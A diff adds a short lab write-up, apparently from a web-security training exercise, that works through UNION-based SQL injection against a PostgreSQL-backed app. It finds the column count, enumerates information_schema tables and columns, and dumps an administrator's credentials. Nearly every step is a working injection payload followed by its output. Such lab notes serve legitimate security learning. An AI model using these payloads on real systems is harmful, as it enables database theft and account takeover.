@@ -1,0 +1,33 @@
+Lab #9 SQL injection attack, listing the database contents on non-Oracle databases
+
+Goals
+ - Determine the table that contains usernames and passwords
+ - Determin the relevant columns
+ - Login as the admin user
+
+ Analysis:
+ ----------
+ 1. Find the number of columns
+    ' order by 2-- >> 200
+    ' order by 3-- >> 500
+    Using 2 columns
+
+2. Find the data type of the columns
+    ' union select 'a', 'a'-- >> 200
+    Both columns accept strings
+
+3. Determine version of database
+    ' union select null, version()-- >> 200 
+    PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
+
+4. Output list of table names in the database
+    ' UNION SELECT table_name, null FROM information_schema.tables
+    Found >> users_vcxihz
+
+5. Output column names from the selected table
+    ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_vcxihz'--
+    Found >> username_dlfmwc, password_xpyyzb
+
+6. Output usernames and password from columns
+    ' UNION SELECT username_dlfmwc, password_xpyyzb from users_vcxihz--
+    Found >> administrator: p3ty13iaqbzplzcvzi0w
